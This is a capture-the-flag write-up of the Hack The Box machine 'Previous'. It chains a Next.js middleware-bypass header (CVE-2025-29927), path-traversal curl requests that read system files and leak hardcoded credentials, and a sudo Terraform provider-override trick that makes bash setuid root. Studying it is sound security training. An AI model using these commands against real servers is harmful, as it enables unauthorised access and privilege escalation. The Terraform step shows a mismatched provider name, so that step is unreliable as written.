---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - CVE-2025-29927
  - LFI
  - Next-JS
  - Terraform
---
# Overview

| Name        | Previous    |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A previous.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 21:07 +0545
Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.76% done; ETC: 21:08 (0:00:02 remaining)
Nmap scan report for previous.htb (10.10.11.83)
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: PreviousJS
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   405.56 ms 10.10.14.1
2   407.53 ms previous.htb (10.10.11.83)
```
# Enumeration

Subdomain fuzzing gave nothing, directory fuzzing gave `/api`, `/docsis` and `/signin` but all redirect to `/signin` page and its only beta accessible.

![[previous_1 1.png]]

![[previous_2.png]]

We got username `jeremy` probably.
## CVE-2025-29927

We can try NextJS recent CVE.

```http
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
## Param Fuzz

We can use it to fuzz `/api` parameters.

```bash
❯ dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/at0m/Hentai/HTB/previous/reports/http_previous.htb/_api_25-09-05_07-29-03.txt

Target: http://previous.htb/

[07:29:03] Starting: api/
[07:29:08] 308 -   22B  - /api/%2e%2e//google.com  ->  /api/%2E%2E/google.com
[07:30:09] 400 -   64B  - /api/auth/admin
[07:30:09] 400 -   64B  - /api/auth/login.php
[07:30:09] 400 -   64B  - /api/auth/login
[07:30:09] 400 -   64B  - /api/auth/login.jsp
[07:30:09] 400 -   64B  - /api/auth/adm
[07:30:09] 400 -   64B  - /api/auth/login.aspx
[07:30:09] 400 -   64B  - /api/auth/login.html
[07:30:09] 400 -   64B  - /api/auth/logon
[07:30:09] 400 -   64B  - /api/auth/login.js
[07:30:09] 302 -    0B  - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
[07:30:10] 308 -   28B  - /api/axis2-web//HappyAxis.jsp  ->  /api/axis2-web/HappyAxis.jsp
[07:30:10] 308 -   23B  - /api/axis//happyaxis.jsp  ->  /api/axis/happyaxis.jsp
[07:30:10] 308 -   34B  - /api/axis2//axis2-web/HappyAxis.jsp  ->  /api/axis2/axis2-web/HappyAxis.jsp
[07:30:18] 308 -   56B  - /api/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[07:30:33] 400 -   28B  - /api/download
[07:30:35] 308 -   43B  - /api/engine/classes/swfupload//swfupload.swf  ->  /api/engine/classes/swfupload/swfupload.swf
[07:30:35] 308 -   46B  - /api/engine/classes/swfupload//swfupload_f9.swf  ->  /api/engine/classes/swfupload/swfupload_f9.swf
[07:30:38] 308 -   31B  - /api/extjs/resources//charts.swf  ->  /api/extjs/resources/charts.swf
[07:30:47] 308 -   41B  - /api/html/js/misc/swfupload//swfupload.swf  ->  /api/html/js/misc/swfupload/swfupload.swf

Task Completed
```

Fuzzing `/api/download` parameter.

```bash
❯ git clone https://github.com/TheKingOfDuck/fuzzDicts
Cloning into 'fuzzDicts'...
remote: Enumerating objects: 817, done.
remote: Total 817 (delta 0), reused 0 (delta 0), pack-reused 817 (from 1)
Receiving objects: 100% (817/817), 22.49 MiB | 2.51 MiB/s, done.
Resolving deltas: 100% (366/366), done.

❯ ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w fuzzDicts/paramDict/AllParam.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2
<SNIP>
example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 337ms]
```
# Exploitation
## Local File Inclusion (LFI)

```bash
❯ curl 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

Lets see some common environment files.

```bash
❯ curl 'http://previous.htb/api/download?example=../../../../proc/self/environ' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'  --output -
NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production 
```

Default structure of Next JS application.

```bash
my-next-app/
├── app/
│   ├── layout.js        // Root layout
│   ├── page.js          // Homepage
│   ├── about/
│   │   ├── layout.js    // Layout for /about
│   │   └── page.js      // /about page
│   ├── blog/
│   │   ├── layout.js    // Layout for /blog
│   │   ├── page.js      // /blog list page
│   │   └── [slug]/
│   │       └── page.js  // /blog/:slug detail page
│   └── dashboard/
│       ├── layout.js    // Layout for /dashboard
│       └── page.js      // /dashboard page
├── public/
│   ├── logo.png         // Static assets
│   └── favicon.ico      // Website icon
├── node_modules/        // Project dependencies
├── package.json         // Project configuration file
├── next.config.js       // Next.js configuration file
└── .next/               // Build output directory
```

In `.next` this is most common things to have:

```bash
.next/
├── build-manifest.json       # Lists all JS/CSS chunks used by the app
├── prerender-manifest.json   # Info about static/dynamic pages (useful for hidden routes)
├── routes-manifest.json      # Mapping of routes -> files (VERY useful for enumeration)
├── server/
│   ├── app/                  # Compiled code for App Router pages (/app/*)
│   ├── pages/                # Compiled code for Pages Router (/pages/*)
│   ├── middleware.js         # Compiled middleware logic
│   └── chunks/               # Code split chunks
├── server/app-render/        # Rendering logic for App Router
├── server/pages/             # Rendering logic for Pages Router
├── static/
│   └── chunks/               # Webpack chunks for client-side JS
├── cache/                    # Incremental static regeneration cache
├── trace                    # Tracing data for performance/debugging
├── package.json              # Sometimes duplicated here
└── NEXT_BUILD_ID             # Random build ID string
```

```bash
❯ curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -s | jq
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}
```

Among them is the authentication logic part we are concerned about, `/api/auth/[...nextauth]`.

```bash
~/Hentai/HTB/previous ❯ curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})(); 
```

We got `Jeremy:MyNameIsJeremyAndILovePancakes`. SSH.

```bash
jeremy@previous:~$ ls
docker  user.txt
jeremy@previous:~$ cat user.txt
b7b5c699e13baafe4904362003f2fe65
```
# Privilege Escalation
## Terraform Exploit

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy:
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

- **`!env_reset`** → sudo does **not clear environment variables**.
- **`env_delete+=PATH`** → sudo will remove the `PATH` variable.
- `/opt/examples` **exists but is not writable** by jeremy. It contains a Terraform configuration.

```
jeremy@previous:~$ ls -la
total 40
drwxr-x--- 5 jeremy jeremy 4096 Sep  4 15:06 .
drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
drwxr-xr-x 2 root   root   4096 Sep  4 15:06 .terraform.d
-rw-rw-r-- 1 jeremy jeremy  107 Sep  4 15:01 .terraformrc
-rw-r----- 1 root   jeremy   33 Sep  4 15:00 user.txt
jeremy@previous:~$
```

```bash
jeremy@previous:~$ cd /opt/examples
jeremy@previous:/opt/examples$ ls
main.tf  terraform.tfstate
jeremy@previous:/opt/examples$ cat main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

Read [Terraform Exploit](https://github.com/dollarboysushil/Privilege-Escalation-PoC-Terraform-sudo-Exploit).

```bash
jeremy@previous:~$ ls
docker  user.txt
jeremy@previous:~$ cat /opt/examples/*.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
jeremy@previous:~$ cat > /tmp/terraform-provider-examples << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
jeremy@previous:~$ chmod +x /tmp/terraform-provider-examples
jeremy@previous:~$ cat > /tmp/at0m.rc << 'EOF'
provider_installation {
  dev_overrides {
    "at0m.com/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF
jeremy@previous:~$ export TF_CLI_CONFIG_FILE=/tmp/at0m.rc
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│
│ The following provider development overrides are set in the CLI configuration:
│  - at0m.com/terraform/examples in /tmp
│
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to
│ become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are
needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
jeremy@previous:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
00cabb413365b267c8fe09045b4ca30e
```

---
